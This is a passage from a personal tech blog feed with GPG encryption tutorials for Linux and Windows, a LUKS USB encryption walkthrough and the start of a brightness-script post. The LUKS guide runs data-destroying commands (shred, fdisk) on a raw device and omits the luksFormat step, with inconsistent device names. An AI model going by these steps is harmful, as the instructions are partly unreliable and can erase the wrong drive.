<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gpg: key D81710193A5FC56A marked as ultimately trusted
</span></span><span style="display:flex;"><span>gpg: directory <span style="color:#e6db74">&#39;/home/charles/.gnupg/openpgp-revocs.d&#39;</span> created
</span></span><span style="display:flex;"><span>gpg: revocation certificate stored as <span style="color:#e6db74">&#39;/home/charles/.gnupg/openpgp-revocs.d/C4A3CFC-
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">51a
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">B1318FFD4D2C291D81710193A5FC56A.rev&#39;</span>
</span></span><span style="display:flex;"><span>public and secret key created and signed
</span></span></code></pre></div><ul>
<li>To verify the keys were created you can use this command:(returns all keys in Charles&rsquo; keyring.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gpg --list-keys
</span></span></code></pre></div><ul>
<li>Example Output:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/home/charles/.gnupg/pubring.kbx
</span></span><span style="display:flex;"><span>-----------------------------------
</span></span><span style="display:flex;"><span>pub   rsa3072 2019-12-11 <span style="color:#f92672">[</span>SC<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>expires: 2021-12-10<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>C4A3CFC51B1318FFD4D2C291D81710193A5FC56A
</span></span><span style="display:flex;"><span>uid           <span style="color:#f92672">[</span>ultimate<span style="color:#f92672">]</span> charles &lt;charles@email.com&gt;
</span></span><span style="display:flex;"><span>sub   rsa3072 2019-12-11 <span style="color:#f92672">[</span>E<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>expires: 2021-12-10<span style="color:#f92672">]</span>
</span></span></code></pre></div><h2 id="step-2-exporting-and-importing-keys">Step 2: Exporting and Importing Keys</h2>
<p>The person sending a message needs the receiver&rsquo;s Public Key to encrypt the message for them. Charles will need to export his Public Key to make it Public, so others like Jack can use it.</p>
<ul>
<li>
<p>Exporting puts the Public Key in a format that can be shared and used to encrypt.</p>
</li>
<li>
<p>Charles would use the following command to export his Public Key:</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gpg --armor --output charles.gpg --export charles@email.com
</span></span></code></pre></div><ul>
<li>
<p><code>gpg</code>: The command to run GPG.</p>
</li>
<li>
<p><code>--armor</code>: Puts the key in an ASCII format.</p>
</li>
<li>
<p><code>--output charles.gpg</code>: Creates the Public Key in an accessible format. In this case, we named the key <code>charles.gpg</code>.</p>
</li>
<li>
<p><code>--export charles@email.com</code>: References which key to use from the key ring. It is referenced by the email.</p>
</li>
<li>
<p>To view the exported key, in the folder you exported it:</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat charles.gpg
</span></span></code></pre></div><p>Example Output(shortened):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-----BEGIN PGP PUBLIC KEY BLOCK-----
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>oCN2AghQUDgu5yBVAmPAx7hatvcMBR1X6NqJN4wStLB21OvHdgT2VbiHUtwkGvbJ
</span></span><span style="display:flex;"><span>Hsui9eTR7bBY1YgP8PcGFjeMZ5+C7E94uYeksbwMzFWGE79M3kqEi1tgkDZTN/T8
</span></span><span style="display:flex;"><span>8O31qQUgDCCbUnuvpW5pYJ2BconeNBHAZNKSKg+9U3DfCazRpky89be6W7WtjDGs
</span></span><span style="display:flex;"><span>iFo5PEjBTvCJJXHvDgn2W7I7U0MWO220gyCT/Ja/eKad5GKTeMjOC4ERTwvha0ON 
</span></span><span style="display:flex;"><span>-----END PGP PUBLIC KEY BLOCK-----
</span></span></code></pre></div><ul>
<li>Now, Charles can either put this Public Key on his website, and/or share it directly with someone. ie:<code>Jack</code></li>
</ul>
<p>Here are the steps that Jack needs to take.</p>
<ul>
<li>After Jack saves the key he will need to import it into the keyring.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gpg --import charles.gpg
</span></span></code></pre></div><ul>
<li>Confirm it was imported by listing the keys.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gpg --list-keys
</span></span></code></pre></div><ul>
<li>This should show Jack&rsquo;s addition of Charles&rsquo; key (Jack has not created any keys yet).</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pub   rsa3072 2019-12-03 <span style="color:#f92672">[</span>SC<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>expires: 2021-12-02<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>39B2BD6C93E1E63E8C004183FE91AF7A7B4EC267
</span></span><span style="display:flex;"><span>uid   <span style="color:#f92672">[</span>ultimate<span style="color:#f92672">]</span> Charles &lt;charles@email.com&gt;
</span></span><span style="display:flex;"><span>sub   rsa3072 2019-12-03 <span style="color:#f92672">[</span>E<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>expires: 2021-12-02<span style="color:#f92672">]</span>
</span></span></code></pre></div><h2 id="step-3-encryption">Step 3: Encryption</h2>
<p>Jake now has Charles&rsquo; Public Key in his key ring, so he is ready to create a message and encrypt it.</p>
<ul>
<li>Jake will want to create a file that will contain a message, so we&rsquo;ll use the following echo command to create a file called <code>Jacks_plainmessage.txt</code>.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;Hi Charles, my bank account number is 2783492&#34;</span> &gt; Jacks_plainmessage.txt
</span></span></code></pre></div><ul>
<li>
<p>The next step is to use Charles&rsquo; Public Key to encrypt <code>Jacks_plainmessage.txt</code>.</p>
</li>
<li>
<p>We will use the following command:</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gpg --armor --output Jacks_encryptedmessage.txt --encrypt --recipient /
</span></span><span style="display:flex;"><span>charles@email.com Jacks_plainmessage.txt
</span></span></code></pre></div><ul>
<li>
<p><code>gpg</code>: The command to run GPG.</p>
</li>
<li>
<p><code>--armor</code>: Puts the encrypted message in an ASCII format.</p>
</li>
<li>
<p><code>--output Jacks_encryptedmessage.txt</code>: Command for the output file, which creates the name of the encrypted file.</p>
</li>
<li>
<p><code>--encrypt</code>: Tells GPG to encrypt.</p>
</li>
<li>
<p><code>--recipient charles@email.com</code>: Tells GPG which Public Key to use, based on the email address of the key.</p>
</li>
<li>
<p><code>Jacks_plainmessage.txt</code>: Specifies for GPG which plaintext file to encrypt.</p>
</li>
<li>
<p>Run the command to created a file that has ciphertext called <code>Jacks_encryptedmessage.txt</code>.</p>
</li>
<li>
<p>Run a preview command to illustrate the file has now been encrypted:</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat Jacks_encryptedmessage.txt
</span></span></code></pre></div><ul>
<li>The encrypted message should look like the following:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-----BEGIN PGP MESSAGE-----
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>hQGMA1p4Le4c2oCaAQv+MT2ghzg9RYymSIxnbwe41LpOPx76mA9f6mQYZO77c/Ij
</span></span><span style="display:flex;"><span>u14kEgfaVM9PxxBw8KpEkg5NvmBVPAfxFbFrcLoKB8lVW8MTpp3mQ8r0257PNORK
</span></span><span style="display:flex;"><span>bQOC+HHktQN3AJrsgN/Oj4OduM+hMtnPUdWa0X7uOOKRFW9r5CbuYga134EzoHG3
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-----END PGP MESSAGE-----
</span></span></code></pre></div><h2 id="step-4-decryption">Step 4: Decryption</h2>
<p>The last step is for Jack to send his encrypted message over to Charles, so she can decrypt it with her Private Key.</p>
<ul>
<li>
<p>Once Charles receives Jack&rsquo;s encrypted message, she will save it in a directory and then run decryption commands against the file.</p>
</li>
<li>
<p>The command that Charles will use to decrypt Jack&rsquo;s encrypted message is:</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gpg --output Jacks_decrypted_message --decrypt Jacks_encryptedmessage.txt
</span></span></code></pre></div><ul>
<li>
<p><code>gpg</code>: The command to run gpg.</p>
</li>
<li>
<p><code>--output Jacks_decrypted_message</code>: This creates an output file, which is the decrypted message.</p>
</li>
<li>
<p><code>--decrypt Jacks_encryptedmessage.txt</code>: This is indicating to decrypt and what file to decrypt.</p>
</li>
<li>
<p>Run the command. It just decrypted Jack&rsquo;s message and placed the results into a file called <code>Jacks_decrypted_message</code>.</p>
</li>
<li>
<p>Preview the decrypted file by running:</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat Jacks_decrypted_message
</span></span></code></pre></div><ul>
<li>This shows that now Charles can see Jack&rsquo;s plaintext message:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#e6db74">&#34;Hi Charles, my bank account number is 2783492.&#34;</span>
</span></span></code></pre></div><h2 id="signing">Signing</h2>
<p>Signing with GPG gives the ability to verify that a file came from you or a specific person.<br>
You can verify signature before extracting the data.</p>
<p>Signing:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gpg --sign text.txt
</span></span></code></pre></div><p>Verifying:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gpg --verify text.txt.gpg
</span></span></code></pre></div><p>You can also have a detached signature file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gpg --detach-sign text.txt
</span></span></code></pre></div><p>Then, you need to have both <code>text.txt</code> and <code>text.txt.sig</code> in the same directory and verify the signature with <code>gpg --verify text.txt.sig</code>.<br>
This part was just a quick overview of the signing.</p>
<h1 id="windows">Windows</h1>
<h2 id="step-1-setup">Step 1: Setup</h2>
<p>Download and Install  <a href="https://www.gpg4win.org">GPG4Win</a>, then run Kleopatra after the Install Wizard is done. You will come to this screen.</p>

    <img src="/img/kleostart.PNG"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<h2 id="step-2-generating-key-pairs">Step 2: Generating Key Pairs</h2>
<ul>
<li>Then, in Kleopatra, Navigate to:
<ul>
<li>File -&gt; New Key Pair</li>
<li>(this walkthrough) We will be working with the OpenPGP key pairs.</li>
</ul>
</li>
</ul>

    <img src="/img/kleonewpair.PNG"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<h1 id="heading-4"></h1>
<h1 id="heading-5"></h1>
<ul>
<li>Now it will ask you to enter your Name and Email, your Identifiers. I would also suggest protecting the generated key with a passphrase. Enter the desired information.</li>
<li>Click <code>Advanced Settings</code>, this is where you select your encryption type as well as desired usage like Signing, Authentication, and Expiration Date</li>
<li>We will use <code>RSA</code> for this quick tutorial.</li>
<li>The <code>2048 bits</code> is the default encryption strength, I suggest using the max number of bits offered. For me <code>4096 bits</code>. Click <code>Ok</code>.</li>
<li>When everything is set right click <code>Create</code>.</li>
</ul>

    <img src="/img/kleoadvset.PNG"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<ul>
<li>Then enter your desired passphrase for your new key pair.</li>
<li>Then it will generate the key pair, and depending on your computer the completion time may vary. After it Generates you should see this window.</li>
</ul>

    <img src="/img/kleogensuc.PNG"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<ul>
<li>Then clicking <code>Finish</code>, you should be able to see your key now listed in Kleopatra.</li>
</ul>

    <img src="/img/kleofirstlist.PNG"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<h2 id="step-3-exporting-public-keys">Step 3: Exporting Public Keys</h2>
<p><em>Public Key</em></p>
<ul>
<li>For this to function properly, you will need to Export your Public Key so others can get it and encrypt files/messages for you.</li>
<li>To do this we will <code>Right Click</code> on your key you just created and click <code>Export</code>:
<ul>
<li>Then you may rename it as you wish, I tend to use my Name Identifier and public like <code>johnSmith_public</code>.</li>
<li>The save window will already have it set to the <code>.gpg</code> file extension.</li>
<li>Then save it somewhere you can easily access(Desktop, Documents).</li>
</ul>
</li>
</ul>
<h2 id="step-4-importing-public-keys">Step 4: Importing Public Keys</h2>
<ul>
<li>Find the Recipients Public Key, and you can copy the contents to a new text file.</li>
<li>Open Kleopatra, and on the top action bar there is an <code>Import</code> button. Click it then navigate to that text file you just created and <code>Open</code> it.</li>
<li><strong>NOTE</strong> You may have to set the dropdown right above the <code>Open</code> button to <code>Any files</code>.</li>
<li>There should now be an <code>Imported Certificates</code> tab next to the <code>All Certificates</code> tab.</li>
</ul>

    <img src="/img/kleopubimport.PNG"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<h2 id="step-5-encrypting-data">Step 5: Encrypting Data</h2>
<ul>
<li>To Encrypt data, one way is:
<ul>
<li>Open the text you are wanting to encrypt.</li>
<li>Select it all and then Copy it to the clipboard(Ctrl+c, or right-click and select <code>Copy</code>).</li>
<li>Then go over to your icon tray area. It is likely on the bottom of the screen, I&rsquo;ve set mine to the top of the screen.</li>
<li>Right Click on the Kleopatra Icon in the tray.</li>
<li>Got to the <code>Clipboard</code> selection then select <code>Encrypt</code>:</li>
</ul>
</li>
</ul>

    <img src="/img/kleoencr.PNG"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<ul>
<li>Once it is encrypted, it gets sent back to your clipboard.</li>
<li>Paste your newly encrypted text into a document, save and send to the recipient.</li>
</ul>

    <img src="/img/kleoencrmess.PNG"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<h2 id="step-6-decrypting-data">Step 6: Decrypting Data</h2>
<ul>
<li>Open the encrypted file sent to you into a document:
<ul>
<li>Select all of the text and Copy it into your clipboard.</li>
<li>Go back to the icon tray, right click on the Kleopatra Icon, navigate to <code>Clipboard</code> and select <code>Decrypt/Verify</code>.</li>
</ul>
</li>
</ul>

    <img src="/img/kleodecrmess.PNG"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<ul>
<li>Decrypted text will be in your clipboard.</li>
<li>Open a document and Paste the Decrypted text into that document.</li>
</ul>
<h2 id="my-simple-programs">My Simple Programs</h2>
<p>Some simple encrypt/decrypt/signing programs I made.</p>
<p><a href="https://github.com/jb-williams/Bash_Projects/tree/main/GPG">Github</a></p>
<h2 id="common-gui-apps">Common GUI Apps</h2>
<p><a href="https://www.gnupg.org/related_software/gpa/">gpa</a> - Linux</p>
<p><a href="https://apps.kde.org/kleopatra/">Kleopatra</a> - Linux</p>
<h2 id="gpg-gui-for-windows">GPG GUI for Windows</h2>
<p><a href="https://www.gpg4win.org">gpg4win</a> - Windows(gpg4win comes with Kleopatra)</p>
<h2 id="good-gui-video-tutorial">Good GUI Video Tutorial</h2>
<p><a href="https://www.youtube.com/watch?v=CEADq-B8KtI">HackerSploit</a> - YouTube</p>
]]></content>
        </item>
        
        <item>
            <title>My_Usb_Encrypton_Process</title>
            <link>https://xfafnir.com/posts/2022/08/my_usb_encrypton_process/</link>
            <pubDate>Fri, 26 Aug 2022 16:43:11 -0500</pubDate>
            
            <guid>https://xfafnir.com/posts/2022/08/my_usb_encrypton_process/</guid>
            <description>LUKS USB Encryption for Linux performed by: jb-williams This is the process I use to partition and encrypt usb drives.
I have not tested tested it on anything other than usb&amp;rsquo;s, though a similar process would potentially work. !! Notice !! Running these commands on the wrong drive could Erase All Data on that Drive!!
Only Recoverable if You Had a Backup Make sure you know: Device Name(ie: /dev/sdb) Device Size(ie: 15GiB) REQS:</description>
            <content type="html"><![CDATA[<h1 id="luks-usb-encryption-for-linux">LUKS USB Encryption for Linux</h1>
<h4 id="performed-by-jb-williams">performed by: jb-williams</h4>
<h1 id="heading"></h1>
<p>This is the process I use to partition and encrypt usb drives.</p>
<ul>
<li>I have not tested tested it on anything other than usb&rsquo;s, though a similar process would potentially work.</li>
</ul>
<p><strong>!! Notice !!</strong>
<strong>Running these commands on the wrong drive could Erase All Data on that Drive!!</strong></p>
<ul>
<li>Only Recoverable if You Had a Backup</li>
<li>Make sure you know:
<ul>
<li>Device Name(ie: /dev/sdb)</li>
<li>Device Size(ie: 15GiB)</li>
</ul>
</li>
</ul>
<p>REQS:</p>
<ul>
<li>
<p>linux</p>
</li>
<li>
<p>cryptsetup    (deb package)<br>
<strong>(depending on desired file system)</strong></p>
</li>
<li>
<p>dosfstools - FAT32, vfat <em>(can be read by both Windows and Linux)</em></p>
</li>
<li>
<p>ntfs-3g    - NTFS, ntfs <em>(Windows)</em></p>
</li>
<li>
<p>(standard on linux) - EXT4, ext4 <em>(Linux)</em></p>
</li>
<li>
<p>I use the package <code>udiskie</code> to mount and dismount the drive.</p>
</li>
</ul>
<h3 id="step-1">Step 1</h3>
<ul>
<li>(Surprise) Insert the usb</li>
<li>Find the desired device name for the usb</li>
<li><em>For this walkthrough we are goinig to assume that the Computer Hard Drive is /dev/sda, the desired USB is /dev/sdb from here out</em><br>
<code>/dev/sda</code> - computer<br>
<code>/dev/sdb</code> - usb\</li>
</ul>
<p>to find device name:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>lsblk
</span></span></code></pre></div><p><em>example output</em>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT
</span></span><span style="display:flex;"><span>sda      8:0    <span style="color:#ae81ff">0</span> 931.5G  <span style="color:#ae81ff">0</span> disk 
</span></span><span style="display:flex;"><span>|-sda1   8:1    <span style="color:#ae81ff">0</span>   100M  <span style="color:#ae81ff">0</span> part /boot
</span></span><span style="display:flex;"><span>|-sda2   8:2    <span style="color:#ae81ff">0</span>    53G  <span style="color:#ae81ff">0</span> part /
</span></span><span style="display:flex;"><span>|-sda3   8:3    <span style="color:#ae81ff">0</span>   293G  <span style="color:#ae81ff">0</span> part /home
</span></span><span style="display:flex;"><span>|-sda7   8:4    <span style="color:#ae81ff">0</span>     4G  <span style="color:#ae81ff">0</span> part <span style="color:#f92672">[</span>SWAP<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>|-sda5   8:5    <span style="color:#ae81ff">0</span>    30G  <span style="color:#ae81ff">0</span> part /tmp
</span></span><span style="display:flex;"><span>|-sda6   8:6    <span style="color:#ae81ff">0</span>    30G  <span style="color:#ae81ff">0</span> part /var
</span></span><span style="display:flex;"><span>sdb      8:12   <span style="color:#ae81ff">1</span>  14.7G  <span style="color:#ae81ff">0</span> disk 
</span></span><span style="display:flex;"><span>|-sdb1   8:13   <span style="color:#ae81ff">1</span>     4G  <span style="color:#ae81ff">0</span> part 
</span></span><span style="display:flex;"><span><span style="color:#e6db74">`</span>-sdb2   8:14   <span style="color:#ae81ff">1</span>  10.5G  <span style="color:#ae81ff">0</span> part
</span></span></code></pre></div><ul>
<li>Then, if you wish you can switch user to <em>root</em>, we will be here. Also make double-check that the device is unmounted.<br>
Remember USB is /dev/sdb.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>su - <span style="color:#f92672">&amp;&amp;</span> umount /dev/sdb
</span></span></code></pre></div><ul>
<li>Next, before we partition and encrypt the drive, we will &ldquo;shred&rdquo; the data on the usb. This writes over the data that exists on it in an attempt destroy any recoverable data. It can be done a specified number of times.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>shred -v -n <span style="color:#ae81ff">1</span> /dev/sdb
</span></span></code></pre></div><p>Where &ldquo;-v&rdquo; is verbose so you can monitor the progress, and &ldquo;-n 1&rdquo; is the number of iterations or number of times it should be overwitten. I have read anywhere between 1-7 is ok.</p>
<h3 id="step-2">Step 2</h3>
<p>At this point the data is clear on the usb and we will start partitioning and formatting the device. During this part you can create several partitions and encrypt and format then as you prefer.</p>
<p>I will will go through this using <em>fdisk</em> and use the all the available space.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>fdisk /dev/sdb
</span></span></code></pre></div><ul>
<li>&ldquo;o&rdquo; for DOS disklabel</li>
<li>&ldquo;n&rdquo; to create new partition</li>
<li>&ldquo;p&rdquo; set it as primary</li>
<li>Use the Full Disk Sectors, would usually be the default if no sizes are specified</li>
<li>&ldquo;w&rdquo; will write the changes</li>
</ul>
<p>Now we are ready to begin encrypting the usb with <em>cryptsetup</em> and give it the name &ldquo;ENCRYPTED&rdquo;.</p>
<ul>
<li>if the following commands don&rsquo;t properly name the drive. after it&rsquo;s open you can open another terminal and either do <code>lsblk</code> to find the name of the drive, or <code>ls /dev/mapper/</code> and find the correct one.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cryptsetup luksOpen /dev/sdb1 &lt;desired_drive_name&gt;
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cryptsetup luksOpen /dev/sdb1 ENCRYPTED
</span></span></code></pre></div><ul>
<li>
<p>It will ask for a Passphrase, make sure it is a strong complex passphrase.</p>
</li>
<li>
<p>Now choose the format that best suits your needs. If you intend to use the device on GNU/Linux and Windows alike, you should opt for <code>FAT32</code> (<code>mkfs.vfat</code> command, required to have the <code>dosfstools</code> package installed) or <code>NTFS</code> (<code>mkfs.ntfs</code> command, required to have the <code>ntfs-3g</code> package installed). If you use only on machines with GNU/Linux, <code>EXT4</code> (command <code>mkfs.ext4</code>) will be a good choice.</p>
</li>
<li>
<p>The <code>-L</code> and <code>-n</code> options are used to provide a recognizable name to the unit. In this example we will use in the <code>NAME ENCRYPTED</code>.</p>
</li>
</ul>
<p>To format as EXT4:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkfs.ext4 /dev/mapper/LUKS0001 -L ENCRYPTED
</span></span></code></pre></div><p>To format as FAT32:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkfs.vfat /dev/mapper/LUKS0001 -n ENCRYPTED
</span></span></code></pre></div><p>To format as NTFS:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkfs.ntfs /dev/mapper/LUKS0001 -L ENCRYPTED
</span></span></code></pre></div><p>Finally, close the partition:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cryptsetup luksClose &lt;desired_drive_name&gt;
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cryptsetup luksClose /dev/sdb1 ENCRYPTED
</span></span></code></pre></div><p>Now it is fine to get back to the regular user.</p>
<h3 id="step-3">Step 3</h3>
<p>Interacting with the drive through command-line.</p>
<ul>
<li>To open and mount the encrypted drive from the command line.</li>
<li>best practice to run <code>lsblk</code> again to check device name.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>udiskie-mount /dev/sdb1 <span style="color:#f92672">&amp;&amp;</span> udiskie-mount /dev/mapper/&lt;encrypted_dev_name&gt;
</span></span></code></pre></div><p>Then to unmount you just:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>udiskie-umount /dev/mapper/&lt;encrypted_dev_name&gt;
</span></span></code></pre></div><ul>
<li>If it was just and un-encrypted drive the commands would just be:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>udiskie-mount /dev/sdb1
</span></span><span style="display:flex;"><span>udiskie-umount /dev/sdb1
</span></span></code></pre></div><h1 id="heading-1"></h1>
<h1 id="heading-2"></h1>
<p><em>written and performed by jb williams</em> - <a href="https://github.com/jb-williams/">github</a></p>
]]></content>
        </item>
        
        <item>
            <title>Brightxf</title>
            <link>https://xfafnir.com/posts/2022/08/brightxf/</link>
            <pubDate>Fri, 26 Aug 2022 11:59:26 -0500</pubDate>
            
            <guid>https://xfafnir.com/posts/2022/08/brightxf/</guid>
            <description>Brightxf performed by: jb-williams !! Run at Own Risk !!
No issues have come from my use of these but that doesn&amp;rsquo;t mean there won&amp;rsquo;t be I enjoy making/finding the most minimal gui and still be functional as a daily-driver(functional specifically to my needs). I tend to prefer cwm, a simple window manager, and sxhkd, used as a hot-key daemon, and I test my setup on several different laptops of different specs.</description>
            <content type="html"><![CDATA[<h1 id="brightxf">Brightxf</h1>
<h4 id="performed-by-jb-williams">performed by: jb-williams</h4>
<h1 id="heading"></h1>
<p><strong>!! Run at Own Risk !!</strong></p>
<ul>
<li>No issues have come from my use of these but that doesn&rsquo;t mean there won&rsquo;t be</li>
</ul>
<p>I enjoy making/finding the most minimal gui and still be functional as a daily-driver(functional specifically to my needs). I tend to prefer cwm, a simple window manager, and sxhkd, used as a hot-key daemon, and I test my setup on several different laptops of different specs.<br>
I have major issues getting all my &ldquo;Fn&rdquo;+ F1-12 keys to work properly across all my devices and just can&rsquo;t seem to wrap my head around any explanation I&rsquo;ve come across(very likely just me). So, I put together these series of scripts and a systemd service file to specifically give both easy terminal control of your screen brightness as well as easily assigning hot-keys with sxhkd.</p>
<ul>
<li>
<p>Copy these somewhere in your PATH:</p>
<ul>
<li>brcur - current brightness</li>
<li>brwn  - brightness down</li>
<li>brup  - brightness up</li>
<li>brmx  - set brightness to max</li>
<li>brightxf - main script</li>
</ul>
</li>
<li>
<p>As sudo(root), make a directory <em>/etc/startup</em> and copy <em>brightness_mod.sh</em> there.</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo mkdir -p /etc/startup <span style="color:#f92672">&amp;&amp;</span> sudo cp /path/to/brightness_mod.sh /etc/startup
